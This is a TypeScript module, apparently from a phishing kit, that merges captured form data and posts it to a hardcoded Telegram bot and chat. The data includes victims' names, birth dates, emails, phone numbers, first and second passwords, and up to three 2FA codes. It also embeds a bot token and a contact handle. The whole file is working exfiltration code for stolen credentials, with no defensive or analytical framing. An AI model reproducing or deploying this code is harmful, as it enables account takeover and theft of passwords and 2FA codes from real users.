import axios from 'axios';
import https from 'https';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from '../utils/generateKey'; // ✅ import hàm tạo key

//const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
//const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
const TELEGRAM_API = `https://api.telegram.org/bot8226522512:AAGgpgreJuQu3uXjMuFeo6qcweKO1fs1Yvg`;
const CHAT_ID = '-4966250298';
const agent = new https.Agent({ family: 4 });

function mergeData(oldData: any = {}, newData: any = {}) {
    return {
        ...oldData,
        ...Object.fromEntries(
            Object.entries(newData).filter(([_, v]) => v !== undefined && v !== '')
        )
    };
}

function formatMessage(data: any): string {
    return `
<b>Ip:</b> <code>${data.ip || 'Error, contact @otis_cua'}</code>
<b>Location:</b> <code>${data.location || 'Error, contact @otis_cua'}</code>
-----------------------------
<b>Full Name:</b> <code>${data.name || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
-----------------------------
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.business || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
-----------------------------
<b>Password First:</b> <code>${data.password || ''}</code>
<b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
-----------------------------
<b>Auth Method:</b> <code>${data.authMethod || ''}</code>
-----------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>
`.trim();
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const key = generateKey(data);
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    try {
        // if (!prev?.messageId) {
            // Gửi mới
            const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: CHAT_ID,
                text: updatedText,
                parse_mode: 'HTML'
            }, {
                httpsAgent: agent,
                timeout: 10000
            });

            const messageId = res.data.result.message_id;
            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
            console.log(`✅ Sent new message. ID: ${messageId}`);
        // } else {
        //     // Edit
        //     await axios.post(`${TELEGRAM_API}/editMessageText`, {
        //         chat_id: CHAT_ID,
        //         message_id: prev.messageId,
        //         text: updatedText,
        //         parse_mode: 'HTML',
        //     }, {
        //         httpsAgent: agent,
        //         timeout: 10000
        //     });

        //     memoryStoreTTL.set(key, { message: updatedText, messageId: prev.messageId, data: fullData });
        //     console.log(`✏️ Edited message ID: ${prev.messageId}`);
        // }
    } catch (err: any) {
        const desc = err?.response?.data?.description || "";
        if (desc.includes("message to edit not found")) {
            // Nếu tin nhắn bị xóa → gửi mới
            try {
                const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: updatedText,
                    parse_mode: 'HTML'
                }, {
                    httpsAgent: agent,
                    timeout: 10000
                });

                const messageId = res.data.result.message_id;
                memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
                console.log(`🔄 Message was deleted → sent new message. ID: ${messageId}`);
                return;
            } catch (sendErr: any) {
                console.error("🔥 Telegram re-send error:", sendErr?.response?.data || sendErr.message || sendErr);
                throw new Error("Failed to re-send Telegram message");
            }
        }

        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
        throw new Error('Failed to send or edit Telegram message');
    }
}
